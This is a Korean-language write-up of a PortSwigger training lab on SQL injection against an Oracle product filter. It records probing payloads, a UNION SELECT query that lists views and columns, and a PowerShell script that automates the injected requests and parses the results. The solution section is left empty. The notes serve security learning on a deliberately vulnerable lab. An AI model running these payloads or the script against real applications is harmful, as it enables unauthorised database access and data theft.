---
title: "SQL injection attack, querying the database type and version on Oracle"
tags:
  - portswigger
  - sql-injection
lab_url: "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle"
difficulty: Practitioner
draft: false
---

# SQL injection attack, querying the database type and version on Oracle

## 문제 조건

이 실습의 **상품 카테고리 필터에는 SQL injection 취약점**이 존재한다. `UNION` 공격을 통해 삽입한 쿼리의 결과를 조회할 수 있으며, 이를 이용해 **데이터베이스의 버전 문자열을 화면에 표시**해야 한다.

- **취약점 위치:** 상품 카테고리 필터.
- **데이터베이스 종류:** Oracle.
- **사용 가능한 공격 방식:** `UNION`을 이용해 삽입한 쿼리의 조회 결과를 가져올 수 있다.
- **해결 조건:** 데이터베이스 버전 문자열을 화면에 표시한다.
- **직접 확인할 사항:** 원래 쿼리의 반환 열 개수와 각 열의 자료형, 결과가 화면에 표시되는 위치 등은 탐색 과정에서 확인한다.

> [!info] 문제에서 주어진 정보
> 위 내용은 공식 문제 설명과 제목을 기준으로 정리했다. 실제 요청, 시도한 입력값과 관찰 결과는 탐색 과정에 기록한다.

## 탐색 과정

### 1. 항상 참인 조건으로 SQL injection 확인 및 다음 공격 방향 구상

먼저 상품 카테고리 필터에 다음과 같이 입력하여 SQL injection 취약점이 있음을 확인했다.

```text
filter?category=' OR 1=1 --
```

**관찰과 판단**

조회한 정보가 화면에 표 형태로 표시되는 것을 관찰했다. 이를 보고, `UNION SELECT`로 다른 조회 결과를 기존 결과에 결합하면 그 정보도 화면에 표시할 수 있을 가능성이 있겠다고 생각했다.

**다음 시도 방향**

`UNION SELECT` 계열 공격을 시도해 보기로 했다. 이 단계에서는 공격 가능성을 구상한 것이며, 실제 `UNION` 쿼리의 성공 여부와 반환 열 개수·자료형은 아직 확인하지 않았다.

### 2. `ORDER BY`로 반환 열 개수 탐색

반환 열 개수를 알아보기 위해 상품 카테고리 필터에 다음 입력값을 순서대로 시도했다.

```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
```

**관찰 결과**

세 번째 입력값인 `' ORDER BY 3 --`을 시도했을 때 화면에 `Internal Server Error`가 표시되었다.

### 3. `UNION SELECT`로 뷰 이름 조회 성공

다음 입력값을 상품 카테고리 필터에 넣어 뷰 이름 조회를 시도했다.

```sql
' UNION SELECT view_name, NULL FROM all_views--
```

**관찰 결과**

뷰 이름을 얻는 데 성공했다. 화면에 `ALL_ALL_TABLES`, `ALL_ANNOTATION_TEXT_METADATA`, `ALL_APPLY` 등의 뷰 이름이 표시되었다.

![UNION SELECT로 뷰 이름 조회에 성공한 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/01-union-select-view-names.png)

### 4. 뷰별 칼럼명·데이터 타입 수집 및 JSON 저장

앞서 얻은 뷰 이름 중 버전과 관련 있어 보이는 9개를 대상으로, PowerShell 반복문을 사용하여 칼럼명과 데이터 타입을 조회했다.

**사용한 쿼리 형태**

```sql
' UNION SELECT column_name, data_type FROM all_tab_columns WHERE table_name = '뷰이름'--
```

`column_name`과 `data_type`을 각각 하나의 열로 반환하도록 했다. 응답 HTML의 `is-table-longdescription` 테이블에서 `<th>`는 칼럼명, `<td>`는 데이터 타입으로 읽었다.

**수집 및 저장 방식**

1. `$viewNames`에 저장한 9개 뷰 이름을 순회한다.
2. 뷰 이름을 쿼리에 넣고 `category` 값을 URL 인코딩하여 같은 실습 세션으로 요청한다.
3. `Parse-Table` 함수로 응답 표의 각 행을 읽고, 태그 제거·HTML 엔티티 디코딩·공백 정리를 수행한다.
4. 각 행을 `viewName`, `column_name`, `data_type` 속성이 있는 객체로 만든다.
5. 모든 결과를 배열에 모아 `ConvertTo-Json`으로 변환하고, 현재 작업 폴더의 `results.json`에 UTF-8로 저장한다.

**실행 코드**

> 아래 코드는 실행에 사용한 코드이며, 세션 토큰만 기록용 자리표시자로 바꿨다.

```powershell
function Parse-Table {
    param(
        [string]$html,
        [string]$viewName
    )

    $clean = {
        param($text)
        $text = [regex]::Replace($text, '<[^>]+>', '')
        $text = [System.Net.WebUtility]::HtmlDecode($text)
        ([regex]::Replace($text, '\s+', ' ')).Trim()
    }

    $table = [regex]::Match(
        $html,
        '(?is)<table\b[^>]*class="is-table-longdescription"[^>]*>(.*?)</table>'
    )

    foreach ($row in [regex]::Matches($table.Groups[1].Value, '(?is)<tr\b[^>]*>(.*?)</tr>')) {
        $th = [regex]::Match($row.Value, '(?is)<th\b[^>]*>(.*?)</th>')
        $td = [regex]::Match($row.Value, '(?is)<td\b[^>]*>(.*?)</td>')

        [pscustomobject]@{
            viewName    = $viewName
            column_name = & $clean $th.Groups[1].Value
            data_type   = & $clean $td.Groups[1].Value
        }
    }
}

# 1. 요청 설정 (세션 토큰은 기록용으로 마스킹)
$baseUrl      = "https://0aca007f03d03d92807f261e00a3004a.web-security-academy.net"
$sessionToken = "<실습 세션 토큰>"

# 2. 세션 및 쿠키 설정
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36"

$cookie = New-Object System.Net.Cookie(
    "session",
    $sessionToken,
    "/",
    ([uri]$baseUrl).Host
)
$session.Cookies.Add($cookie)

$viewNames = @(
    'ALL_FILE_GROUP_VERSIONS'
    'ALL_TYPE_VERSIONS'
    'GV_$VERSION'
    'PRODUCT_COMPONENT_VERSION'
    'SM_$VERSION'
    'USER_FILE_GROUP_VERSIONS'
    'USER_TYPE_VERSIONS'
    'V_$VERSION'
    '_ALL_FILE_GROUP_VERSIONS'
)

$results = @(
    foreach ($viewName in $viewNames) {
        $category = "' UNION SELECT column_name, data_type FROM all_tab_columns WHERE table_name = '$viewname'--"

        # 3. category 값을 URL 인코딩하여 요청 주소 구성
        $encodedCategory = [uri]::EscapeDataString($category)
        $requestUrl = "$baseUrl/filter?category=$encodedCategory"

        # 4. 요청 실행
        $requestParams = @{
            Uri             = $requestUrl
            Method          = "GET"
            WebSession      = $session
            UseBasicParsing = $true
            Headers         = @{
                "Accept"          = "text/html"
                "Accept-Language" = "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"
                "Cache-Control"   = "no-cache"
                "Pragma"          = "no-cache"
            }
        }

        $response = Invoke-WebRequest @requestParams

        # 5. 응답 HTML에서 열 정보 추출
        $html = $response.Content
        Parse-Table -html $html -viewName $viewName
    }
)

ConvertTo-Json -InputObject $results -Depth 5 |
    Set-Content ".\results.json" -Encoding UTF8
```

**관찰 결과**

위 코드로 칼럼명과 데이터 타입을 얻어 `results.json`으로 저장했다. 첨부한 결과 화면에서 확인한 항목은 다음과 같다.

| 뷰 이름 | 칼럼명 | 데이터 타입 |
| --- | --- | --- |
| `ALL_FILE_GROUP_VERSIONS` | `COMMENTS` | `VARCHAR2` |
| `ALL_FILE_GROUP_VERSIONS` | `CREATED` | `TIMESTAMP(6) WITH TIME ZONE` |
| `ALL_FILE_GROUP_VERSIONS` | `CREATOR` | `VARCHAR2` |
| `ALL_FILE_GROUP_VERSIONS` | `DEFAULT_DIRECTORY` | `VARCHAR2` |
| `ALL_FILE_GROUP_VERSIONS` | `FILE_GROUP_NAME` | `VARCHAR2` |
| `ALL_FILE_GROUP_VERSIONS` | `FILE_GROUP_OWNER` | `VARCHAR2` |
| `ALL_FILE_GROUP_VERSIONS` | `VERSION` | `NUMBER` |
| `ALL_FILE_GROUP_VERSIONS` | `VERSION_NAME` | `VARCHAR2` |
| `ALL_TYPE_VERSIONS` | `HASHCODE` | `RAW` |

위 표는 스크린샷에 보이는 결과 일부다. 현재 단계에서는 뷰의 칼럼 구조를 확보했으며, 데이터베이스 버전 문자열을 표시해 실습을 해결했는지는 아직 기록하지 않았다.

![뷰별 칼럼명과 데이터 타입을 results.json에 저장한 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/02-column-names-and-data-types-json.png)

### 5. 뷰별 조회 결과를 CSV로 저장한 시도

앞서 저장한 `results.json`을 읽고 `viewName`별로 묶은 뒤, 각 그룹의 칼럼을 순회하는 PowerShell 코드를 실행했다. 응답 HTML에서 `is-table-longdescription` 테이블의 각 `<th>` 텍스트를 추출하고, 뷰별로 모아 CSV로 저장했다.

**수집 및 저장 방식**

1. `Parse-Table`에서 HTML 태그를 제거하고 엔티티를 디코딩한 뒤 공백을 정리했다. `<th>`가 없는 행은 건너뛰었다.
2. 추출값은 `column_name` 속성으로 반환했으며, 이번 함수의 `data_type`은 빈 문자열로 두었다.
3. 각 칼럼에서 얻은 문자열을 `$viewResults[$viewName]` 배열에 순서대로 이어 붙였다.
4. CSV의 헤더는 뷰 이름으로 지정했다. 가장 긴 배열에 맞춰 행을 만들고, 값이 부족한 열은 빈 문자열로 채웠다.
5. `Export-Csv -NoTypeInformation -Encoding UTF8`로 `C:\Users\NowKyeong\Downloads\ViewResults\results.csv`에 저장했다.

**첨부 CSV에서 확인한 결과**

- 확인 파일: 업로드된 `results(1).csv`.
- [수집 CSV 원본 보기](https://github.com/ddomology/portswigger-lab-notes/blob/main/content/labs/sql-injection/data/lab-querying-database-version-oracle/view-results-20260930.csv)
- 헤더를 제외한 데이터는 **81행·9열**이며, 비어 있지 않은 셀은 **432개**였다.

| 뷰 이름(CSV 헤더) | 비어 있지 않은 값 수 | 고유 문자열 수 | 아래 9개 값의 반복 횟수 |
| --- | ---: | ---: | ---: |
| `ALL_FILE_GROUP_VERSIONS` | 72 | 9 | 8 |
| `ALL_TYPE_VERSIONS` | 72 | 9 | 8 |
| `GV_$VERSION` | 18 | 9 | 2 |
| `PRODUCT_COMPONENT_VERSION` | 27 | 9 | 3 |
| `SM_$VERSION` | 27 | 9 | 3 |
| `USER_FILE_GROUP_VERSIONS` | 63 | 9 | 7 |
| `USER_TYPE_VERSIONS` | 63 | 9 | 7 |
| `V_$VERSION` | 9 | 9 | 1 |
| `_ALL_FILE_GROUP_VERSIONS` | 81 | 9 | 9 |

모든 열에 다음 9개 문자열이 같은 순서로 반복되어 있었다.

```text
COMMENTS
CREATED
CREATOR
DEFAULT_DIRECTORY
FILE_GROUP_NAME
FILE_GROUP_OWNER
VERSION_GUID
VERSION_ID
VERSION_NAME
```

**관찰 범위와 해석**

CSV 저장 결과는 확보했지만, 이 파일에는 데이터베이스 버전 문자열이 보이지 않았다. 위 문자열은 **CSV에 실제로 저장된 값**이며, 각 뷰의 실제 칼럼 구조나 조회 성공을 검증한 목록으로 해석하지 않았다.

제공한 코드에서는 여러 칼럼의 응답을 뷰별 한 배열에 이어 붙이므로, CSV에는 각 값이 어느 칼럼 요청에서 나왔는지 남지 않는다. 같은 행에 놓인 서로 다른 뷰의 값들도 동일한 데이터베이스 레코드를 뜻하지 않는다.

원본 HTTP 응답과 요청별 오류 로그는 이번 첨부에 포함되지 않았다. 같은 문자열이 반복된 원인은 이 CSV만으로 확정하지 않았으며, 실습 해결 여부도 아직 확인하지 않았다.


## 해결 과정

## 배운 점

-

## 참고

- [PortSwigger 원본 실습](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
